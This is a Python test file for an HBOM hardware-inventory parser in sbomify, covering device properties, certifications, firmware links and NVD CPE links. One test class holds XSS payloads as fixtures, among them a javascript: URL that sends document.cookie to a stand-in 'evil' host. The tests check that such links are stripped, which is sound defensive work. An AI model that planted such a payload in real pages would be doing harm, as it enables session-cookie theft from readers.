"""Tests for the HBOM hardware-parts inventory derivation."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from sbomify.apps.sboms.hardware_inventory import (
    HardwareInventory,
    HardwarePart,
    derive_hardware_inventory,
    nvd_cpe_url,
)

_DATA = Path(__file__).parent / "test_data"


def _load(name: str) -> dict:
    return json.loads((_DATA / name).read_text())


def _by_name(inventory: HardwareInventory, name: str) -> HardwarePart:
    return next(p for p in inventory.parts if p.name == name)


def _document(*components: dict[str, Any], **extra: Any) -> dict[str, Any]:
    return {"bomFormat": "CycloneDX", "specVersion": "1.6", "components": list(components), **extra}


def test_derives_the_pcie_sata_example():
    inventory = derive_hardware_inventory(_load("hbom_pcie_sata_adapter.cdx.json"))

    # Six board parts. The adaptor board itself is metadata.component — the
    # subject of the document rather than a line on its own bill of materials —
    # so it joins the parts only on a display read (include_root, below).
    assert inventory.count == 6
    assert inventory.by_type == {"device": 6}
    assert "pcie-sata-adaptor-board" not in {p.name for p in inventory.parts}

    connector = _by_name(inventory, "PCIE-098-02-F-D-EMS2")
    assert connector.manufacturer == "Samtec"
    assert connector.manufacturer_source == "supplier"  # no manufacturer field in the 1.4 example
    assert connector.revision == "2.9.10"
    assert connector.type == "device"
    assert connector.quantity == "1"
    assert connector.function == "connector"
    assert connector.location == "mainboard"
    assert connector.device_type == "thru-hole"
    assert connector.datasheets == ("https://www.samtec.com/products/pcie-098-02-f-d-ems2",)

    molex = _by_name(inventory, "47155-4001")
    assert molex.quantity == "8"
    assert molex.gs1 == (("gtin-12", "822348522712"),)

    # Every part carries the four cdx:device basics the example populates.
    assert all(p.manufacturer and p.quantity and p.function and p.location and p.device_type for p in inventory.parts)


def test_parts_keep_document_order():
    inventory = derive_hardware_inventory(_load("hbom_pcie_sata_adapter.cdx.json"))
    assert [p.bom_ref for p in inventory.parts][:2] == ["PCIE-098-02-F-D-EMS2", "molex-47155-4001"]


def test_component_without_device_properties_still_projects_the_basics():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "bom-ref": "d1",
                "name": "STM32F407VGT6",
                "version": "rev-C",
                "manufacturer": {"name": "STMicroelectronics"},
            }
        )
    )

    part = inventory.parts[0]
    assert (part.name, part.manufacturer, part.revision, part.type) == (
        "STM32F407VGT6",
        "STMicroelectronics",
        "rev-C",
        "device",
    )
    assert part.manufacturer_source == "manufacturer"
    assert part.quantity is None
    assert part.gs1 == ()
    assert part.certifications == ()


def test_manufacturer_falls_back_supplier_then_publisher():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "device", "name": "a", "manufacturer": {"name": "Maker"}, "supplier": {"name": "Distributor"}},
            {"type": "device", "name": "b", "supplier": {"name": "Distributor"}, "publisher": "Pub"},
            {"type": "device", "name": "c", "publisher": "Pub"},
            {"type": "device", "name": "d"},
            {"type": "device", "name": "e", "manufacturer": {"name": ""}, "supplier": "not-an-object"},
        )
    )

    assert [(p.manufacturer, p.manufacturer_source) for p in inventory.parts] == [
        ("Maker", "manufacturer"),
        ("Distributor", "supplier"),
        ("Pub", "publisher"),
        (None, None),
        (None, None),
    ]


def test_projects_every_cdx_device_property():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "widget",
                "properties": [
                    {"name": "cdx:device:quantity", "value": "3"},
                    {"name": "cdx:device:function", "value": "sensor"},
                    {"name": "cdx:device:location", "value": "daughterboard"},
                    {"name": "cdx:device:deviceType", "value": "smd"},
                    {"name": "cdx:device:sku", "value": "SKU-9"},
                    {"name": "cdx:device:serialNumber", "value": "SN-1234"},
                    {"name": "cdx:device:lotNumber", "value": "LOT-7"},
                    {"name": "cdx:device:prodTimestamp", "value": "2024-03-01"},
                    {"name": "cdx:device:macAddress", "value": "00:1b:44:11:3a:b7"},
                    {"name": "cdx:device:gs1:gtin-13", "value": "4006381333931"},
                    {"name": "cdx:device:gs1:epcRfid", "value": "urn:epc:id:sgtin:0614141.112345.400"},
                ],
            }
        )
    )

    part = inventory.parts[0]
    assert part.quantity == "3"
    assert part.function == "sensor"
    assert part.location == "daughterboard"
    assert part.device_type == "smd"
    assert part.sku == "SKU-9"
    assert part.serial_number == "SN-1234"
    assert part.lot_number == "LOT-7"
    assert part.prod_timestamp == "2024-03-01"
    assert part.mac_address == "00:1b:44:11:3a:b7"
    assert dict(part.gs1) == {
        "gtin-13": "4006381333931",
        "epcRfid": "urn:epc:id:sgtin:0614141.112345.400",
    }


def test_parses_structured_certification_keys():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "radio",
                "properties": [
                    {"name": "cdx:device:certifications:US:FCC:id", "value": "2AB3C-XYZ"},
                    {"name": "cdx:device:certifications:US:FCC:url", "value": "https://example.test/fcc"},
                    {"name": "cdx:device:certifications:DE:BNetzA:id", "value": "D-1234"},
                    # Missing the id|url segment, and a bare prefix: neither is a certification.
                    {"name": "cdx:device:certifications:JP", "value": "ignored"},
                    {"name": "cdx:device:certifications:JP:MIC:unknown", "value": "ignored"},
                ],
            }
        )
    )

    certifications = {(c.country, c.authority): c for c in inventory.parts[0].certifications}
    assert set(certifications) == {("US", "FCC"), ("DE", "BNetzA")}
    assert certifications[("US", "FCC")].identifier == "2AB3C-XYZ"
    assert certifications[("US", "FCC")].url == "https://example.test/fcc"
    assert certifications[("DE", "BNetzA")].identifier == "D-1234"
    assert certifications[("DE", "BNetzA")].url is None


def test_links_firmware_through_the_dependency_graph():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "device", "bom-ref": "mcu", "name": "MCU"},
            {"type": "firmware", "bom-ref": "fw", "name": "bootloader", "version": "2.1"},
            {"type": "device", "bom-ref": "led", "name": "LED"},
            dependencies=[
                {"ref": "mcu", "dependsOn": ["fw", "led", "mcu", 7, "missing"]},
                {"ref": "led", "dependsOn": []},
                "not-a-dependency",
            ],
        )
    )

    assert _by_name(inventory, "MCU").firmware == ("bootloader 2.1",)
    assert _by_name(inventory, "LED").firmware == ()
    # The firmware component is itself a part — it is a hardware-document type.
    assert inventory.by_type == {"device": 2, "firmware": 1}


def test_ignores_software_components():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "library", "name": "left-pad"},
            {"type": "device", "name": "board"},
            {"type": "operating-system", "name": "linux"},
        )
    )
    assert [p.name for p in inventory.parts] == ["board"]


class TestTheDeviceTheDocumentDescribes:
    """``metadata.component`` is the assembled board, and a display read lists it.

    The stamp that makes a page select an artifact counts a device found there,
    and the release-level merge lifts the same component into its inventory, so
    leaving it out rendered "no parts" for a document that demonstrably holds
    hardware — and showed a board as a part of the release but not of the
    artifact the release pinned. Assessment keeps the default: the HBOM plugin
    scores the assembly through its own final-goods-assembly checks.
    """

    def _rooted(self, root: Any, *components: dict[str, Any]) -> dict[str, Any]:
        return _document(*components, metadata={"component": root})

    def test_a_device_named_only_in_metadata_is_a_part(self):
        document = self._rooted({"type": "device", "bom-ref": "board-1", "name": "adaptor board"})

        assert derive_hardware_inventory(document, include_root=True).count == 1
        assert derive_hardware_inventory(document).count == 0  # assessment path, unchanged

    def test_the_root_is_projected_like_any_other_part(self):
        document = self._rooted(
            {
                "type": "device",
                "name": "adaptor board",
                "version": "rev-1",
                "manufacturer": {"name": "Maker"},
                "properties": [{"name": "cdx:device:location", "value": "chassis"}],
            }
        )

        part = derive_hardware_inventory(document, include_root=True).parts[0]
        assert (part.name, part.revision, part.manufacturer, part.location) == (
            "adaptor board",
            "rev-1",
            "Maker",
            "chassis",
        )

    def test_the_root_comes_last_and_the_parts_keep_document_order(self):
        document = self._rooted(
            {"type": "device", "bom-ref": "board", "name": "board"},
            {"type": "device", "bom-ref": "p1", "name": "p1"},
            {"type": "device", "bom-ref": "p2", "name": "p2"},
        )

        inventory = derive_hardware_inventory(document, include_root=True)
        assert [p.bom_ref for p in inventory.parts] == ["p1", "p2", "board"]

    def test_a_platform_root_is_lifted_too(self):
        """The merge lifts any hardware root, not only a ``device``."""
        document = self._rooted({"type": "platform", "bom-ref": "rack", "name": "rack"})

        assert [p.type for p in derive_hardware_inventory(document, include_root=True).parts] == ["platform"]

    def test_a_software_root_is_never_lifted(self):
        document = self._rooted(
            {"type": "application", "bom-ref": "app", "name": "app"},
            {"type": "device", "bom-ref": "p1", "name": "p1"},
        )

        assert [p.bom_ref for p in derive_hardware_inventory(document, include_root=True).parts] == ["p1"]

    def test_a_root_repeated_in_components_yields_one_part(self):
        """Generators emit the board in both places; the merge collapses it, so this does too."""
        board = {"type": "device", "bom-ref": "board", "name": "board"}
        document = self._rooted(board, board, {"type": "device", "bom-ref": "p1", "name": "p1"})

        assert [p.bom_ref for p in derive_hardware_inventory(document, include_root=True).parts] == ["board", "p1"]

    def test_the_root_picks_up_its_firmware_edge(self):
        document = _document(
            {"type": "firmware", "bom-ref": "fw", "name": "bootloader", "version": "2.1"},
            metadata={"component": {"type": "device", "bom-ref": "board", "name": "board"}},
            dependencies=[{"ref": "board", "dependsOn": ["fw"]}],
        )

        inventory = derive_hardware_inventory(document, include_root=True)
        assert _by_name(inventory, "board").firmware == ("bootloader 2.1",)

    @pytest.mark.parametrize(
        "document",
        [
            {},
            {"metadata": "not-a-dict"},
            {"metadata": {}},
            {"metadata": {"component": "not-a-dict"}},
            {"metadata": {"component": None}},
            {"metadata": {"component": {"type": None}}},
            {"components": "not-a-list", "metadata": {"component": {"type": "device", "name": "board"}}},
            {"metadata": {"component": {"type": "device", "bom-ref": ["not-a-string"]}}},
        ],
    )
    def test_malformed_metadata_never_raises(self, document: Any):
        assert isinstance(derive_hardware_inventory(document, include_root=True), HardwareInventory)

    def test_a_document_with_no_components_key_still_lifts_its_root(self):
        """The projection used to bail before reading metadata when ``components`` was absent."""
        document = {"metadata": {"component": {"type": "device", "name": "board"}}}

        assert [p.name for p in derive_hardware_inventory(document, include_root=True).parts] == ["board"]


def test_the_board_itself_is_a_part_only_on_a_display_read():
    document = _load("hbom_pcie_sata_adapter.cdx.json")

    lifted = derive_hardware_inventory(document, include_root=True)
    assert lifted.count == 7
    assert lifted.by_type == {"device": 7}
    assert lifted.parts[-1].bom_ref == "pcie-sata-adaptor-board"


@pytest.mark.parametrize(
    "document",
    [
        None,
        "not-a-document",
        {},
        {"components": "not-a-list"},
        {"components": []},
        {"components": [None, "junk", 7]},
        # A property bag that is not a list, entries that are not dicts, entries
        # missing name or value, and structured values where a string belongs.
        {"components": [{"type": "device", "name": "a", "properties": "nope"}]},
        {"components": [{"type": "device", "name": "a", "properties": {"cdx:device:sku": "x"}}]},
        {"components": [{"type": "device", "name": "a", "properties": [None, 1, "x"]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"value": "orphan"}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": "cdx:device:sku"}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": 7, "value": {"a": 1}}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": "cdx:device:gs1:", "value": "x"}]}]},
        {"components": [{"type": "device", "name": {"nested": "name"}, "version": ["1"], "cpe": 7}]},
        {"components": [{"type": "device", "externalReferences": "nope"}]},
        {"components": [{"type": "device", "externalReferences": [None, {"type": "documentation"}]}]},
        {"components": [{"type": "device", "bom-ref": "a"}], "dependencies": "nope"},
        {"components": [{"type": "device", "bom-ref": "a"}], "dependencies": [{"ref": "a", "dependsOn": "nope"}]},
    ],
)
def test_malformed_documents_never_raise(document: Any):
    inventory = derive_hardware_inventory(document)
    assert isinstance(inventory, HardwareInventory)
    assert isinstance(inventory.by_type, dict)


def test_first_property_of_a_duplicated_name_wins():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "a",
                "properties": [
                    {"name": "cdx:device:quantity", "value": "2"},
                    {"name": "cdx:device:quantity", "value": "999"},
                ],
            }
        )
    )
    assert inventory.parts[0].quantity == "2"


class TestUploaderControlledUrls:
    """ADR-004 stores an artifact exactly as received, so a document can carry a
    javascript: URL and the renderer is the only thing between it and a reader —
    an anonymous one, on a public product."""

    def _part(self, doc: dict) -> object:
        return derive_hardware_inventory(doc).parts[0]

    def test_a_javascript_datasheet_is_dropped(self) -> None:
        part = self._part(
            {
                "components": [
                    {
                        "type": "device",
                        "name": "STM32",
                        "externalReferences": [
                            {"type": "documentation", "url": "javascript:fetch('//evil/'+document.cookie)"},
                            {"type": "documentation", "url": "https://st.com/datasheet.pdf"},
                        ],
                    }
                ]
            }
        )

        assert part.datasheets == ("https://st.com/datasheet.pdf",)

    def test_a_javascript_certification_url_is_dropped_but_the_id_is_kept(self) -> None:
        """The approval identifier is still evidence; only the link is unusable."""
        part = self._part(
            {
                "components": [
                    {
                        "type": "device",
                        "name": "STM32",
                        "properties": [
                            {"name": "cdx:device:certifications:US:FCC:url", "value": "javascript:alert(1)"},
                            {"name": "cdx:device:certifications:US:FCC:id", "value": "FCC-123"},
                        ],
                    }
                ]
            }
        )

        certification = part.certifications[0]
        assert certification.identifier == "FCC-123"
        assert certification.url is None

    @pytest.mark.parametrize(
        "scheme",
        ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)", "/relative/path"],
    )
    def test_only_absolute_http_and_mailto_links_survive(self, scheme: str) -> None:
        """A relative path is rejected too: a supplier datasheet is absolute by
        definition, and a bare path would resolve against sbomify's own origin."""
        part = self._part(
            {
                "components": [
                    {"type": "device", "name": "p", "externalReferences": [{"type": "documentation", "url": scheme}]}
                ]
            }
        )

        assert part.datasheets == ()


class TestNvdCpeLink:
    """The link-out targets NVD's CPE dictionary, not its vulnerability search.

    NVD replaced the query-parameter vulnerability results endpoint with a
    single-page app whose only input is a keyword, and that keyword search does
    not match a CPE string. Verified against the live site: the full 2.3 name of
    a real Intel part returns 0 records, its vendor and product as terms return
    784.
    """

    def test_vendor_and_product_become_the_search_terms(self) -> None:
        url = nvd_cpe_url("cpe:2.3:h:intel:core_i7:-:*:*:*:*:*:*:*")

        assert url.startswith("https://nvd.nist.gov/products/cpe/search/results?")
        assert "keyword=intel+core_i7" in url
        assert "namingFormat=2.3" in url

    def test_an_escaped_colon_does_not_split_a_field(self) -> None:
        """A CPE field may contain an escaped colon, so counting colons to test
        well-formedness rejects valid names."""
        url = nvd_cpe_url(r"cpe:2.3:h:acme:foo\:bar:-:*:*:*:*:*:*:*")

        assert "keyword=acme+foo%3Abar" in url

    @pytest.mark.parametrize(
        "cpe",
        [
            "cpe:2.2:/h:intel:core_i7",  # a 2.2 URI, not a 2.3 name
            "not-a-cpe",
            "cpe:2.3:h",  # truncated before vendor and product
            "cpe:2.3:h:*:*:-:*:*:*:*:*:*:*",  # wildcards carry no search terms
        ],
    )
    def test_a_name_with_nothing_to_search_for_yields_no_link(self, cpe: str) -> None:
        """A link that lands on "no results" is worse than no link."""
        assert nvd_cpe_url(cpe) is None
